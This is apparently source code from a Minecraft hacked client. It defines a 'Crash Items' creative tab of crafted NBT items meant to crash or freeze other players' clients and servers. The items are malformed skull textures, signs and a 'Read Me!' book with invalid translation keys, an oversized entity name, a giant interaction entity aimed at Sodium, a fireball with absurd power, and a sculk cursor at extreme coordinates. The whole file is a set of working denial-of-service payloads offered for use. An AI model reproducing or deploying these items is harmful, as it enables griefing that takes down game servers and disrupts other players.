package de.nekosarekawaii.vandalism.feature.creativetab.impl;

import de.nekosarekawaii.vandalism.feature.creativetab.AbstractCreativeTab;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.*;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.List;

import static de.nekosarekawaii.vandalism.util.minecraft.ItemStackUtil.withClientSide;

public class CrashItemsCreativeTab extends AbstractCreativeTab {

    public CrashItemsCreativeTab() {
        super(Text.literal("Crash Items"), Items.BARRIER);
    }

    @Override
    public void exposeItems(List<ItemStack> items) {
        items.add(withClientSide(createCrashSkull("ewogICJ0aW1lc3RhbXAiIDogMTY4ODYwNjcyODYzNywKICAicHJvZmlsZUlkIiA6ICJhNDAxNDkxYTAwZTI0OGVmYTZmZjcxMjI2Y2ZhNzU1NCIsCiAgInByb2ZpbGVOYW1lIiA6ICJlZDBjaW5VIiwKICAic2lnbmF0dXJlUmVxdWlyZWQiIDogdHJ1ZSwKICAidGV4dHVyZXMiIDogewogICAgIlNLSU4iIDogewogICAgICAidXJsIiA6ICIiLAogICAgICAibWV0YWRhdGEiIDogewogICAgICAgICJtb2RlbCIgOiAic2xpbSIKICAgICAgfQogICAgfQogIH0KfQ=="), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Client Crash Head")));
        items.add(withClientSide(createCrashSkull("ewogICJ0aW1lc3RhbXAiIDogMTY4ODYwNjcyODYzNywKICAicHJvZmlsZUlkIiA6ICJhNDAxNDkxYTAwZTI0OGVmYTZmZjcxMjI2Y2ZhNzU1NCIsCiAgInByb2ZpbGVOYW1lIiA6ICJlZDBjaW5VIiwKICAic2lnbmF0dXJlUmVxdWlyZWQiIDogdHJ1ZSwKICAidGV4dHVyZXMiIDogewogICAgIlNLSU4iIDogewogICAgICAidXJsIiA6ICIgLm1pbmVjcmFmdC5uZXQiLAogICAgICAibWV0YWRhdGEiIDogewogICAgICAgICJtb2RlbCIgOiAic2xpbSIKICAgICAgfQogICAgfQogIH0KfQ=="), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Client Crash Head V2")));
        items.add(withClientSide(createCrashSign("translation.test.invalid"), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Client Instant Crash Sign")));
        items.add(withClientSide(createCrashSign("translation.test.invalid2"), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Client Instant Crash Sign V2")));
        items.add(withClientSide(createCrashBook("translation.test.invalid"), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Client Instant Crash Book")));
        items.add(withClientSide(createCrashBook("translation.test.invalid2"), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Client Instant Crash Book V2")));
        items.add(withClientSide(createClientCrashExperience(), Text.literal(Formatting.GOLD + Formatting.BOLD.toString() + "Client Crash Experience")));
        items.add(withClientSide(createClientCrashArea(), Text.literal(Formatting.RED.toString() + Formatting.BOLD + "Client Crash Area")));
        items.add(withClientSide(createSodiumClientFreezeEntity(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Client Sodium Freeze Entity")));
        items.add(withClientSide(createClientInstantCrashPot(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Client Instant Crash Pot")));
        items.add(withClientSide(createServerCrashEntity(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Server Crash Entity")));
        items.add(withClientSide(createInstantCrashSculkItem(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Server Instant Crash Block")));
    }

    private static ItemStack createCrashSkull(final String value) {
        final ItemStack item = new ItemStack(Items.PLAYER_HEAD);
        final NbtCompound base = new NbtCompound();
        final NbtCompound properties = new NbtCompound();
        final NbtList textures = new NbtList();
        final NbtCompound data = new NbtCompound();
        data.putString("Signature", "RlOgHNDlW3KdoWBda6VoMWqvD21ESva9BC6DvexuutaLdBwLuFpf/5kHVnQV6DcjbON9A8H4QY1D9GiYly468B+KzSpTRo/JeyDYr96uQc9RTq+U62uxxcDodgo4d465RJtx7TXIzVJX00OQqX1xHU3q6Lquk+iV4QFHRd/O3nzFVt8d2iWyArshMtXUZTtoGPthK8JrbWHI+EHBWNfSFU4MM40yD/7BCC/Td23x4LGP+gm4y6N2PyD6WLolGD8qXzRW5T5UMTbABU1/e6V/nAPYz7dTDuGVCh+x9qCDWt0a7Du6/31wo67mKysHD7Jp5QL/AT/uuP6N+DGi2/HeWDZJwm+cdH93mpCmK74cO71m/FwCBuC3QxI8GfhtXkS22dI+5bMEbLTMcrWyWwM1+7nciXQA/CGtmZpSCfiJI595nX4pmIG2YVCVy9OzVsnIjNt0vL5UfIJasWu3GkIOepuHeaE9HZ/Vw/XWncGBEAURitbPeRZj2slSTPoP1sx3J5LrObCY8L1HqazMLYeX5VulR49YJmg7PEQUsi/mQJAwj0xnHx7bCPWiNcMNOFHUoAUF1MDGZvSmiw7cfMClOpp+wzJB1kWnDRQmoCXnsk5nX2wYqiXXqJ6TkuOKk7BhiKjUtTVSv9eyUn2xZfcn9nxcolr0fmNH+brDAsVIMug=");
        data.putString("Value", value);
        textures.add(data);
        properties.put("textures", textures);
        final NbtCompound skullOwner = new NbtCompound();
        skullOwner.putIntArray("Id", new int[]{-1543419622, 14829807, -1493208798, 1828353364});
        skullOwner.put("Properties", properties);
        skullOwner.putString("Name", "ed0cinU");
        base.put("SkullOwner", skullOwner);
        item.setNbt(base);
        return item;
    }

    private static ItemStack createCrashSign(final String component) {
        final ItemStack item = new ItemStack(Items.OAK_SIGN);
        final NbtCompound base = item.getOrCreateNbt();
        final NbtCompound blockEntityTag = new NbtCompound();
        blockEntityTag.put("Text1", NbtString.of(Text.Serializer.toJson(Text.translatable(component))));
        blockEntityTag.put("Text2", NbtString.of(Text.Serializer.toJson(Text.literal(""))));
        blockEntityTag.put("Text3", NbtString.of(Text.Serializer.toJson(Text.literal(""))));
        blockEntityTag.put("Text4", NbtString.of(Text.Serializer.toJson(Text.literal(""))));
        base.put("BlockEntityTag", blockEntityTag);
        return item;
    }

    private static ItemStack createCrashBook(final String component) {
        final ItemStack item = new ItemStack(Items.WRITTEN_BOOK);
        final NbtList pages = new NbtList();
        pages.add(NbtString.of(Text.Serializer.toJson(Text.translatable(component))));
        item.setSubNbt("pages", pages);
        item.setSubNbt("author", NbtString.of("Server"));
        item.setSubNbt("title", NbtString.of("Read Me!"));
        return item;
    }

    private static ItemStack createClientCrashExperience() {
        final ItemStack item = new ItemStack(Items.SHEEP_SPAWN_EGG);
        final NbtCompound base = new NbtCompound();
        final NbtCompound entityTag = new NbtCompound();
        entityTag.putString("CustomName", Text.Serializer.toJson(Text.literal("#".repeat(10000)).formatted(Formatting.DARK_GREEN, Formatting.BOLD, Formatting.UNDERLINE, Formatting.STRIKETHROUGH, Formatting.ITALIC, Formatting.OBFUSCATED)));
        entityTag.putInt("Value", 1337);
        entityTag.putInt("Count", 999999);
        entityTag.putByte("CustomNameVisible", (byte) 1);
        entityTag.putByte("Glowing", (byte) 1);
        entityTag.putByte("HasVisualFire", (byte) 1);
        entityTag.putString("id", "minecraft:experience_orb");
        base.put("EntityTag", entityTag);
        item.setNbt(base);
        return item;
    }

    private static ItemStack createServerCrashEntity() {
        final ItemStack item = new ItemStack(Items.BAT_SPAWN_EGG);
        final NbtCompound base = new NbtCompound();
        final NbtCompound entityTag = new NbtCompound();
        final NbtList power = new NbtList();
        power.add(NbtDouble.of(1.0E43));
        power.add(NbtDouble.of(0));
        power.add(NbtDouble.of(0));
        entityTag.put("power", power);
        entityTag.putString("id", "minecraft:small_fireball");
        base.put("EntityTag", entityTag);
        item.setNbt(base);
        return item;
    }

    private static ItemStack createClientCrashArea() {
        final ItemStack item = new ItemStack(Items.SALMON_SPAWN_EGG);
        final NbtCompound base = new NbtCompound();
        final NbtCompound entityTag = new NbtCompound();
        entityTag.putFloat("RadiusOnUse", 100f);
        entityTag.putFloat("RadiusPerTick", 1f);
        entityTag.putInt("Duration", 60000);
        entityTag.putFloat("Radius", 100f);
        entityTag.putInt("ReapplicationDelay", 0);
        entityTag.putString("Particle", "elder_guardian");
        entityTag.putString("id", "minecraft:area_effect_cloud");
        base.put("EntityTag", entityTag);
        item.setNbt(base);
        return item;
    }

    private static ItemStack createClientInstantCrashPot() {
        final ItemStack item = new ItemStack(Items.DECORATED_POT);
        final NbtCompound base = new NbtCompound();
        final NbtCompound blockEntityTag = new NbtCompound();
        final NbtList sherds = new NbtList();
        sherds.add(NbtString.of(RandomStringUtils.random(5).toLowerCase() + ":" + RandomStringUtils.random(5).toUpperCase()));
        blockEntityTag.put("sherds", sherds);
        base.put("BlockEntityTag", blockEntityTag);
        item.setNbt(base);
        return item;
    }

    private static ItemStack createSodiumClientFreezeEntity() {
        final ItemStack item = new ItemStack(Items.BAT_SPAWN_EGG);
        final NbtCompound base = new NbtCompound();
        final NbtCompound entityTag = new NbtCompound();
        entityTag.putFloat("width", 999999F);
        entityTag.putFloat("height", 999999F);
        entityTag.putString("id", "minecraft:interaction");
        base.put("EntityTag", entityTag);
        item.setNbt(base);
        return item;
    }

    private static ItemStack createInstantCrashSculkItem() {
        final ItemStack item = new ItemStack(Items.SCULK_CATALYST);
        final NbtCompound base = new NbtCompound();
        final NbtCompound blockEntityTag = new NbtCompound();
        final NbtList cursors = new NbtList();
        final NbtCompound firstCursor = new NbtCompound();
        final NbtList pos = new NbtList();
        pos.add(NbtInt.of(900000000));
        pos.add(NbtInt.of(0));
        pos.add(NbtInt.of(900000000));
        firstCursor.put("pos", pos);
        firstCursor.putInt("charge", 150);
        cursors.add(firstCursor);
        blockEntityTag.put("cursors", cursors);
        base.put("BlockEntityTag", blockEntityTag);
        item.setNbt(base);
        return item;
    }

}
